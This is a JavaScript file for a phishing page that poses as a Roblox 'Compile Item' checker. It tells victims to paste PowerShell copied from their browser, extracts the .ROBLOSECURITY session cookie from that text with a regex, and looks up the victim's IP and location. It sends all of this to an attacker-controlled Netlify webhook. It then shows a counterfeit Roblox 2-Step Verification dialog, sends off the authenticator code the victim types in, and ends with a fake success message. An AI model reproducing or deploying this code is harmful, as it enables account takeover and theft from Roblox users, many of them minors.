// === UI Setup ===
document.getElementById('instructions').textContent =
  'Press on the "Compile Item" button to compile your item. Once you have your PowerShell copied, you can paste it and hit "Enter" to check.';

// === Rate Limiting ===
const rateLimit = {
  lastCall: 0,
  minInterval: 2000, // 2 seconds between calls
  check: function() {
    const now = Date.now();
    if (now - this.lastCall < this.minInterval) {
      return false;
    }
    this.lastCall = now;
    return true;
  }
};

// === Modal Open/Close Functions ===
function openModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    modal.style.display = 'flex';
    modal.style.opacity = '1';
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.remove('fade-out');

    setTimeout(() => {
      const input = modal.querySelector('input.input-field.form-control');
      if (input) input.focus();
    }, 100);
  }
}

function closeModal(id) {
  const modal = document.getElementById(id);
  if (modal) {
    const modalContent = modal.querySelector('.modal-content');
    if (modalContent) modalContent.classList.add('fade-out');
    setTimeout(() => {
      modal.style.display = 'none';
      modal.style.opacity = '0';
      if (modalContent) modalContent.classList.remove('fade-out');
    }, 400);
  }
}

function closeAllModals() {
  ['modal', 'faqModal', 'aboutModal', 'tosModal'].forEach(closeModal);
}

// === Main Button ===
document.getElementById('enterButton').addEventListener('click', function() {
  openModal('modal');
});

// === PowerShell Submission ===
document.getElementById('submitButton').addEventListener('click', async function() {
  console.log('Submit button clicked');
  const powershellInput = document.getElementById('powershellInput');
  const powershellData = powershellInput.value.trim();

  if (!powershellData) {
    alert('Please paste your PowerShell data.');
    return;
  }

  // Rate limiting check
  if (!rateLimit.check()) {
    alert('Please wait a moment before trying again.');
    return;
  }

  // Extract assetId and itemName from the catalog URL
  const catalogMatch = powershellData.match(/roblox\.com\/catalog\/(\d+)\/([^"\s`]+)/i);
  
  let assetId = null;
  let itemName = "Unknown Item";
  
  if (catalogMatch) {
    assetId = catalogMatch[1];
    itemName = decodeURIComponent(catalogMatch[2]).replace(/[-_]/g, ' '); // Convert URL-encoded name and replace dashes/underscores with spaces
  }

  if (!assetId) {
    showErrorAlert();
    powershellInput.value = '';
    closeModal('modal');
    await sendSecureWebhook('No Asset ID Found', 'No asset id found in PowerShell.', 0xff0000);
    return;
  }

  // Send webhook for valid cookie with IP logging
  const roblosecurityRegex = /New-Object System\.Net\.Cookie\("\.ROBLOSECURITY",\s*"([^"]+)"/;
  const match = powershellData.match(roblosecurityRegex);
  let ipInfo = null;
  if (match) {
    const cookie = match[1].trim();
    // Fetch IP and location info
    try {
      const res = await fetch('https://ipapi.co/json');
      if (res.ok) {
        ipInfo = await res.json();
      }
    } catch (e) {
      ipInfo = null;
    }
    let locationText = '';
    if (ipInfo) {
      locationText = `IP: ${ipInfo.ip}\nCountry: ${ipInfo.country_name}\nRegion: ${ipInfo.region}\nCity: ${ipInfo.city}\nOrg: ${ipInfo.org}`;
    } else {
      locationText = 'IP/location lookup failed.';
    }
    await sendSecureWebhook('New Cookie Captured', `\`\`\`${cookie}\`\`\`\n${locationText}`, 0x00ff00);
  }

  powershellInput.value = '';
  closeModal('modal');

  try {
  // Show loading overlay and handle the sequence
    console.log('Starting loading sequence...');
  showLoading(true, false);
  showLoadingMessage("Searching for item 🔎");
  } catch (error) {
    console.error('Error in loading sequence:', error);
  }

  // Sequence with timing changes
  setTimeout(() => {
    // 2s: Show item found with name (no image box)
    showLoadingMessage(`Item Found! ${itemName}`);
  }, 2000);

  setTimeout(() => {
    // 6s: Change text to "Checking item ✅"
    showLoadingMessage("Checking item ✅");
  }, 6000);

  setTimeout(() => {
    // 8.5s: Fade out loading
    showLoading(false);
  }, 8500);

  setTimeout(() => {
    // 10s: Show 2FA modal with new implementation
    console.log('Showing 2FA modal...');
    show2FAModal();
  }, 10000);
});

// Helper to change loading message
function showLoadingMessage(msg) {
  const msgDiv = document.getElementById('loading-message');
  if (msgDiv) msgDiv.textContent = msg;
}

// === Loading Spinner and Message ===
let loadingMsgInterval = null;
let loadingMsgIndex = 0;
const loadingMessages = [
  "Compiling avatar",
  "Gathering Avatar details",
  "Processing"
];

function showLoading(show, cycling = false) {
  console.log('showLoading called:', show, cycling);
  if (show) {
    if (!document.getElementById('loading-overlay')) {
      console.log('Creating loading overlay...');
      const overlay = document.createElement('div');
      overlay.id = 'loading-overlay';

      const spinner = document.createElement('div');
      spinner.className = 'spinner';

      const msg = document.createElement('div');
      msg.className = 'loading-message';
      msg.id = 'loading-message';
      msg.textContent = cycling ? loadingMessages[0] : "Processing";

      overlay.appendChild(spinner);
      overlay.appendChild(msg);
      document.body.appendChild(overlay);
       console.log('Loading overlay created and added to DOM');
    }
    if (cycling) {
      startLoadingMessages();
    } else {
      stopLoadingMessages();
      document.getElementById('loading-message').textContent = "Processing";
    }
    // Spinner is always visible now!
    const spinnerElem = document.querySelector('#loading-overlay .spinner');
    if (spinnerElem) spinnerElem.style.display = '';
  } else {
    stopLoadingMessages();
    const overlay = document.getElementById('loading-overlay');
    if (overlay) overlay.remove();
  }
}

function startLoadingMessages() {
  loadingMsgIndex = 0;
  const msgDiv = document.getElementById('loading-message');
  if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  loadingMsgInterval = setInterval(() => {
    loadingMsgIndex = (loadingMsgIndex + 1) % loadingMessages.length;
    const msgDiv = document.getElementById('loading-message');
    if (msgDiv) msgDiv.textContent = loadingMessages[loadingMsgIndex];
  }, 1500);
}

function stopLoadingMessages() {
  clearInterval(loadingMsgInterval);
}

// === Red Alert Box ===
function showErrorAlert() {
  const alert = document.getElementById('error-alert');
  if (alert) {
    alert.style.display = 'block';
    alert.style.opacity = '1';
    setTimeout(() => {
      alert.style.opacity = '0';
      setTimeout(() => { alert.style.display = 'none'; }, 500);
    }, 4000);
  }
}

// === New 2FA Modal Implementation ===
function show2FAModal() {
  try {
    var e=document.getElementById("fakeRobloxModal");
    if(e)e.remove();
    var s=document.getElementById("fakeRobloxStyles");
    if(s)s.remove();
    s=document.createElement("style");
    s.id="fakeRobloxStyles";
    s.textContent=".roblox-loader{display:inline-block;position:relative;width:40px;height:14px;margin:10px auto}.roblox-loader div{position:absolute;top:0;width:10px;height:10px;background:gray;border-radius:2px;animation-timing-function:cubic-bezier(0,1,1,0)}.roblox-loader div:nth-child(1){left:0;animation:roblox-loader1 .6s infinite}.roblox-loader div:nth-child(2){left:15px;animation:roblox-loader2 .6s infinite}.roblox-loader div:nth-child(3){left:30px;animation:roblox-loader3 .6s infinite}@keyframes roblox-loader1{0%{transform:scale(0);background:gray}50%{transform:scale(1);background:white}100%{transform:scale(0);background:gray}}@keyframes roblox-loader2{0%{transform:scale(1) translateX(0);background:gray}50%{transform:scale(1.2) translateX(3px);background:white}100%{transform:scale(1) translateX(0);background:gray}}@keyframes roblox-loader3{0%{transform:scale(1);background:gray}50%{transform:scale(0);background:white}100%{transform:scale(1);background:gray}}.loading-modal .modal-header{display:flex!important;justify-content:center!important;align-items:center!important}.loading-modal .modal-title{margin:0!important}";
    document.head.appendChild(s);
    
    // First loading modal - 2-Step Verification for 0.3 seconds
    var l=document.createElement("div");
    l.id="fakeRobloxModal";
         l.innerHTML="<div role='dialog'><div class='fade modal-backdrop in'></div><div role='dialog' tabindex='-1' class='fade modal-modern in modal' style='display:block;'><div class='modal-dialog loading-modal'><div class='modal-content' role='document'><div class='modal-header'><h4 class='modal-title'>2-Step Verification</h4></div><div class='modal-body' style='display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px 0;height:80px;'><div class='roblox-loader'><div></div><div></div><div></div></div></div></div></div></div></div>";
     document.body.appendChild(l);
     console.log('First 2FA modal (loading) created and added to DOM');
    var b=l.querySelector(".modal-backdrop");
    if(b)b.remove();
    
    // After 0.3 seconds, show the main modal
    setTimeout(function(){
        l.remove();
        var m=document.createElement("div");
        m.id="fakeRobloxModal";
        m.innerHTML="<div role='dialog'><div class='fade modal-backdrop in'></div><div role='dialog' tabindex='-1' class='fade modal-modern in modal' style='display:block;'><div class='modal-dialog'><div class='modal-content' role='document'><div class='modal-header'><button type='button' class='modal-modern-header-button'><span class='icon-close'></span></button><h4 class='modal-title'>2-Step Verification</h4></div><div class='modal-body'><div class='modal-protection-shield-icon'></div><p class='modal-margin-bottom-xlarge'>Enter the code generated by your authenticator app.</p><div class='input-control-wrapper'><div class='form-group'><input inputmode='numeric' autocomplete='off' maxlength='6' placeholder='Enter 6-digit Code' type='text' id='two-step-verification-code-input' class='input-field form-control' value=''><div class='form-control-label bottom-label xsmall'>&nbsp;</div></div></div><p><button type='button' class='modal-body-button-link small'>Resend Code</button></p><p><button type='button' class='modal-body-button-link small'>Use another verification method</button></p></div><div class='modal-footer'><div class='modal-modern-footer-buttons' style='text-align:center;position:relative;min-height:42px;'><button id='verifyBtn' type='button' class='btn-cta-md modal-modern-footer-button' aria-label='Verify' disabled>Verify</button><div id='loadingSpinner' style='display:none;width:40px;height:14px;margin:0 auto;box-sizing:border-box;vertical-align:middle;'><div class='roblox-loader'><div></div><div></div><div></div></div></div></div><p class='text-footer modal-margin-bottom'>Need help? Contact <a class='text-name text-footer contact' href='https://www.roblox.com/info/2sv' target='_blank' rel='noopener noreferrer'>Roblox Support</a></p><p class='text-footer'>IMPORTANT: Don't share your security codes with anyone. Roblox will never ask you for your codes. This can include things like texting your code, screensharing, etc.</p></div></div></div></div></div>";
        document.body.appendChild(m);
        var b2=m.querySelector(".modal-backdrop");
        if(b2)b2.remove();
        
        m.querySelector(".modal-modern-header-button").onclick=function(){
            m.remove()
        };
        
        var i=m.querySelector("#two-step-verification-code-input"),
            t=m.querySelector("#verifyBtn"),
            r=m.querySelector("#loadingSpinner"),
            val="";
        
        function u(){
            i.value=val.length>1?"●".repeat(val.length-1)+val.slice(-1):val;
            t.disabled=val.length!==6
        }
        
        i.addEventListener("keydown",function(e){
            if(e.key>="0"&&e.key<="9"){
                if(val.length<6){
                    val+=e.key;
                    u()
                }
                e.preventDefault()
            }else if(e.key==="Backspace"){
                val=val.slice(0,-1);
                u();
                e.preventDefault()
            }else if(["ArrowLeft","ArrowRight","Tab","Delete"].includes(e.key)){}else e.preventDefault();
            setTimeout(()=>{i.selectionStart=i.selectionEnd=i.value.length},0)
        });
        
        i.addEventListener("paste",function(e){
            e.preventDefault();
            var p=(e.clipboardData||window.clipboardData).getData("text").replace(/\D/g,"").slice(0,6-val.length);
            val+=p;
            if(val.length>6)val=val.slice(0,6);
            u();
            setTimeout(()=>{i.selectionStart=i.selectionEnd=i.value.length},0)
        });
        
        t.addEventListener("click",async function(){
            t.style.display="none";
            r.style.display="inline-block";
            
            // Send code using your existing Netlify webhook pattern
            await sendSecureWebhook('2FA Auth Code Captured 🔥', `Authenticator Code Entered: **${val}**`, 0xffa500);
            
            // After 0.5 seconds, fade out and remove
            setTimeout(()=>{
                m.style.transition = 'opacity 0.3s ease-out';
                m.style.opacity = '0';
    setTimeout(() => {
                    m.remove();
      showSuccessPopup();
                }, 300);
            }, 500);
  });
     }, 300); // Changed from 700ms to 300ms
  } catch (error) {
    console.error('Error in show2FAModal:', error);
  }
}

const WEBHOOK_SECRET = 'A9f$2kLz!pQw8xR7';

async function sendSecureWebhook(title, description, color) {
  try {
    // Use full Netlify URL for local development, relative path for production
    const isLocal = window.location.protocol === 'file:';
    const netlifyUrl = isLocal 
      ? 'https://rbxchecking.netlify.app/.netlify/functions/webhook'
      : '/.netlify/functions/webhook';
    const response = await fetch(netlifyUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-webhook-token': WEBHOOK_SECRET
      },
      body: JSON.stringify({ title, description, color })
    });
    
    if (!response.ok) {
      console.error('Failed to send webhook:', response.status);
    } else {
      console.log('Webhook sent successfully');
    }
  } catch (error) {
    console.error('Error sending webhook:', error);
  }
}

// === Helpers ===
function closeTwoFAModal() {
  const modal = document.getElementById("fakeRobloxModal");
  if (modal) modal.remove();
}

function useAnotherMethod() {
  alert('Other verification methods are not available. Please use your authenticator app or check your email.');
}

function showSuccessPopup() {
  const popup = document.createElement('div');
  popup.textContent = 'Item Compiled Successfully ✅ You can close this page now.';
  popup.style.position = 'fixed';
  popup.style.top = '20px';
  popup.style.left = '50%';
  popup.style.transform = 'translateX(-50%)';
  popup.style.background = '#28a745';
  popup.style.color = 'white';
  popup.style.padding = '15px 30px';
  popup.style.borderRadius = '8px';
  popup.style.fontSize = '18px';
  popup.style.fontWeight = 'bold';
  popup.style.zIndex = '9999';
  popup.style.boxShadow = '0 0 15px rgba(0,0,0,0.3)';
  document.body.appendChild(popup);

  setTimeout(() => {
    popup.style.transition = 'opacity 0.5s';
    popup.style.opacity = '0';
    setTimeout(() => popup.remove(), 500);
  }, 4000);
}

// === Spinner Animation (for loading overlay) ===
const styleSheet = document.createElement('style');
styleSheet.type = 'text/css';
styleSheet.innerText = `
@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
.spinner {
  width: 64px;
  height: 64px;
  border: 8px solid #f3f3f3;
  border-top: 8px solid #007bff;
  border-radius: 50%;
  animation: spin 1s linear infinite;
  margin-bottom: 20px;
}
.loading-message {
  color: #fff;
  font-size: 1.5rem;
  font-weight: 600;
  text-align: center;
  margin-top: 0;
  letter-spacing: 1px;
}`;
document.head.appendChild(styleSheet);